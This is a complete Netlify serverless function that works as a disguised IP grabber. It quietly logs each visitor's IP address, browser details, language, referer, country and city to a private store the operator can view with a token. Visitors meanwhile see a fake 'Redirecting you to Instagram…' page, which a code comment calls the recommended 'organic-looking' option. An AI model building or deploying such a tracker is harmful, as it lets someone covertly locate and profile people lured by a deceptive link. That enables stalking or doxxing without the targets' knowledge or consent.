import { getStore } from "@netlify/blobs";

const STORE = "hits";
const KEY = "list";
const MAX_HITS = 500;

export const handler = async (event) => {
  const store = getStore(STORE);
  const url = new URL(event.rawUrl);

  // ---- Viewing endpoint: /?view=YOUR_TOKEN ----
  if (url.searchParams.get("view") && url.searchParams.get("view") === process.env.VIEW_TOKEN) {
    const hits = (await store.get(KEY, { type: "json" })) || [];
    return {
      statusCode: 200,
      headers: { "content-type": "application/json; charset=utf-8" },
      body: JSON.stringify(hits, null, 2),
    };
  }

  const h = event.headers;

  const entry = {
    time: new Date().toISOString(),
    ip:
      h["x-nf-client-connection-ip"] ||
      h["client-ip"] ||
      h["x-forwarded-for"] ||
      "unknown",
    ua: h["user-agent"] || "",
    lang: h["accept-language"] || "",
    path: url.pathname,
    referer: h["referer"] || "",
    country: event.geo?.country?.code || "",
    city: event.geo?.city || "",
  };

  // Persist the hit
  try {
    const hits = (await store.get(KEY, { type: "json" })) || [];
    hits.push(entry);
    await store.setJSON(KEY, hits.slice(-MAX_HITS));
  } catch (err) {
    console.error("store error", err);
  }

  // ---- What the visitor sees ----
  // Option A: instant redirect
  // return { statusCode: 302, headers: { Location: "https://www.instagram.com/" } };

  // Option B: organic-looking landing page (recommended)
  const html = `<!doctype html>
<html><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Loading…</title>
<style>
  body{font-family:system-ui,-apple-system,sans-serif;background:#0d0d0d;color:#eee;
       display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
  .box{text-align:center}
  .spin{width:34px;height:34px;border:3px solid #444;border-top-color:#e1306c;
        border-radius:50%;margin:0 auto 18px;animation:s .8s linear infinite}
  @keyframes s{to{transform:rotate(360deg)}}
  a{color:#e1306c;text-decoration:none}
</style>
</head><body>
<div class="box">
  <div class="spin"></div>
  <p>Redirecting you to Instagram…</p>
  <p><a href="https://www.instagram.com/">Tap here if nothing happens</a></p>
</div>
<script>setTimeout(function(){location.href="https://www.instagram.com/"},1200)</script>
</body></html>`;

  return {
    statusCode: 200,
    headers: { "content-type": "text/html; charset=utf-8" },
    body: html,
  };
};